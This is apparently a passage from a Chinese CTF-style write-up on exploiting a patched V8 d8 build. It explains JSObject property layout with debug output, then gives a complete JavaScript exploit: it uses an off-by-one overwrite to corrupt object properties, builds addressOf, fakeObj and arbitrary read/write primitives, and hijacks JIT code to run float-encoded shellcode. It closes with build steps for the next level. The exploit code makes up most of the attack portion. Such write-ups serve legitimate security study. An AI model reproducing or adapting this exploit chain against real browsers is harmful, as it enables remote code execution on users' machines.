
```javascript
let arr = [1.1];
let obj = {in_object1 : 1}; //in-object properties
obj.out_object1 = 2; //normal properties
obj.out_object2 = 3;
p(arr);
p(obj);
```

这样的输出

```text
DebugPrint: 0x1f99000f30e1: [JSArray]
- map: 0x1f99001cb821 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
- prototype: 0x1f99001cb179 <JSArray[0]>
- elements: 0x1f99000f30f9 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
- length: 1
- properties: 0x1f9900000725 <FixedArray[0]>
- All own properties (excluding elements): {
0x1f9900000d99: [String] in ReadOnlySpace: #length: 0x1f9900025fed <AccessorInfo name= 0x1f9900000d99 <String[6]: #length>, data= 0x1f9900000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
}
- elements: 0x1f99000f30f9 <FixedDoubleArray[1]> {
0: 1.1
}
0x1f99001cb821: [Map] in OldSpace
- map: 0x1f99001c01b5 <MetaMap (0x1f99001c0205 <NativeContext[295]>)>
- type: JS_ARRAY_TYPE
- instance size: 16
- inobject properties: 0
- unused property fields: 0
- elements kind: PACKED_DOUBLE_ELEMENTS
- enum length: invalid
- back pointer: 0x1f99001cb7e1 <Map[16](HOLEY_SMI_ELEMENTS)>
- prototype_validity cell: 0x1f9900000a89 <Cell value= 1>
- instance descriptors #1: 0x1f99001cb7ad <DescriptorArray[1]>
- transitions #1: 0x1f99001cb849 <TransitionArray[4]>
Transition array #1:
0x1f9900000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x1f99001cb861 <Map[16](HOLEY_DOUBLE_ELEMENTS)>
- prototype: 0x1f99001cb179 <JSArray[0]>
- constructor: 0x1f99001cae65 <JSFunction Array (sfi = 0x1f990002b3c5)>
- dependent code: 0x1f9900000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
- construction counter: 0
DebugPrint: 0x1f99000f3109: [JS_OBJECT_TYPE]
- map: 0x1f99001d417d <Map[16](HOLEY_ELEMENTS)> [FastProperties]
- prototype: 0x1f99001c10ed <Object map = 0x1f99001c0701>
- elements: 0x1f9900000725 <FixedArray[0]> [HOLEY_ELEMENTS]
- properties: 0x1f99000f315d <PropertyArray[3]>
- All own properties (excluding elements): {
0x1f99001d351d: [String] in OldSpace: #in_object1: 1 (const data field 0, attrs: [WEC]) @ Any, location: in-object
0x1f99001d3535: [String] in OldSpace: #out_object1: 2 (const data field 1, attrs: [WEC]) @ Any, location: properties[0]
0x1f99001d354d: [String] in OldSpace: #out_object2: 3 (const data field 2, attrs: [WEC]) @ Any, location: properties[1]
}
0x1f99001d417d: [Map] in OldSpace
- map: 0x1f99001c01b5 <MetaMap (0x1f99001c0205 <NativeContext[295]>)>
- type: JS_OBJECT_TYPE
- instance size: 16
- inobject properties: 1
- unused property fields: 1
- elements kind: HOLEY_ELEMENTS
- enum length: invalid
- stable_map
- back pointer: 0x1f99001d414d <Map[16](HOLEY_ELEMENTS)>
- prototype_validity cell: 0x1f99001d4175 <Cell value= 0>
- instance descriptors (own) #3: 0x1f99000f3171 <DescriptorArray[3]>
- prototype: 0x1f99001c10ed <Object map = 0x1f99001c0701>
- constructor: 0x1f99001c0c15 <JSFunction Object (sfi = 0x1f990002aa51)>
- dependent code: 0x1f9900000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
- construction counter: 0
```

对于Indexed Properties，这里是`elements`索引

![](upload/attach/202506/971428_HC2JQ5HR7VW5GUS.png)

这里的`in-object`直接存储在`elements`后面，然后`out-objs` 也就是 normal properties，都使用了`properties`来索引，这里的值都`*2`，是因为这个`smi`的表示

![](upload/attach/202506/971428_Y4CWMFAKSAZM2H6.png)

结合上面的观察，可以通过8字节的溢出可以覆盖到`properties`，那么其实就可以控制normal properties，如果修改为一个`obj`的`elements`，然后使用`obj.out_object1 = xxxx;`来索引，同时修改值，这样就可以修改`elements`的`length`，同时继续去修改`obj`的`length`，这样就可以有一个`rw_array`，有这个`rw_array`之后，写`addressOf`、`fakeObject`、`AAR`、`AAW`是很简单的了

构造如下结构，这样索引`out-obj1`的时候就可以修改`length`的值了，后面的步骤就是很熟悉的了

![](upload/attach/202506/971428_NGU27XJRMNVTEWX.png)

## exp

```javascript
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
function lh_u32_to_f64(l,h){
u32[0] = l;
u32[1] = h;
return f64[0];
}
function f64_to_u64(val){
f64[0] = val;
return u64[0];
}
function u64_to_f64(val){
u64[0] = val;
return f64[0];
}
function u64_to_u32_lo(val){
u64[0] = val;
return u32[0];
}
function u64_to_u32_hi(val){
u64[0] = val;
return u32[1];
}
function u32_to_f32(val){
u32[0] = val;
return f32[0];
}
// function stop(){
// %SystemBreak();
// }
// function p(arg){
// %DebugPrint(arg);
// }
function spin(){
while(1){};
}
function hex(str){
return str.toString(16).padStart(16,0);
}
function logg(str,val){
console.log("[+] "+ str + ": " + "0x" + hex(val));
}
// // gain shell
// const shellcode = () => {return [
// 1.9553825422107533e-246,
// 1.9560612558242147e-246,
// 1.9995714719542577e-246,
// 1.9533767332674093e-246,
// 2.6348604765229606e-284
// ];}
const shellcode = () => {return [
1.9710255944286777e-246,
1.971136949489835e-246,
1.97118242283721e-246,
1.9711826272864685e-246,
1.9712937950614383e-246,
-1.6956275879669133e-231
];}
for(let i = 0; i< 10000; i++){
shellcode();
}
function getOffByOne(target){
return f64_to_u64(target.offByOne());
}
function setOffByOne(target, val){
target.offByOne(Number((val)));
}
var oob_array = [1.1];
var obj = {in_obj:1};
obj.a = 2;
var b = [2.2];
// p(oob_array);
// p(obj);
// p(b);
obj_map_addr = u64_to_u32_lo(getOffByOne(oob_array)); //map, properties
obj_properties_addr = u64_to_u32_hi(getOffByOne(oob_array));
elements_addr_of_a = obj_properties_addr - 0x64;
logg("obj_map_addr", obj_map_addr);
logg("obj_properties_addr", obj_properties_addr);
logg("elements_addr_of_a", elements_addr_of_a);
setOffByOne(oob_array, lh_u32_to_f64(obj_map_addr,elements_addr_of_a-4));
obj.a = 0x1000;
setOffByOne(oob_array, lh_u32_to_f64(obj_map_addr,elements_addr_of_a-4-0x10));
obj.a = 0x1000;
// console.log(oob_array.length);
let temp = f64_to_u64(oob_array[0x10]);
logg("tmp",temp);
double_array_map = u64_to_u32_lo(temp); //map, properties
double_properties_addr = u64_to_u32_hi(temp);
logg("double_array_map", double_array_map);
logg("double_properties_addr", double_properties_addr);
// // 修改了oob_array的elements length
function addressOf(object){
oob_array[0x10] = lh_u32_to_f64(obj_map_addr,0);
b[0] = object;
oob_array[0x10] = lh_u32_to_f64(double_array_map,0);
return f64_to_u64(b[0]);
}
function fakeObj(addr){
oob_array[0x10] = lh_u32_to_f64(double_array_map,0);
b[0] = lh_u32_to_f64(addr,0);
oob_array[0x10] = lh_u32_to_f64(obj_map_addr,0);
return b[0];
}
var fake_array = [
lh_u32_to_f64(double_array_map,0),
lh_u32_to_f64(0,0x1000)
];
var fake_array_addr = u64_to_u32_lo(addressOf(fake_array));
var fake_obj = fakeObj(fake_array_addr+0x54);
// p(fake_array);
logg("fake_array_addr",fake_array_addr);
function AAR(addr){
fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
return f64_to_u64(fake_obj[0]);
}
function AAW(addr,val){
logg("addr",addr);
logg("val",val);
fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
// stop();
fake_obj[0] = u64_to_f64(val);
}
// p(shellcode);
var shellcode_addr = u64_to_u32_lo(addressOf(shellcode));
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));
// stop();
shellcode();
// spin();
```

![](upload/attach/202506/971428_KQG7TT6MPFUXQB8.png)

# level-6

## 环境搭建

> 漏洞分析里有完整的patch内容

```bash
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```text
➜ current cat args.gn
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

接着编译

```bash
autoninja -C out/release d8
```

## 漏洞分析
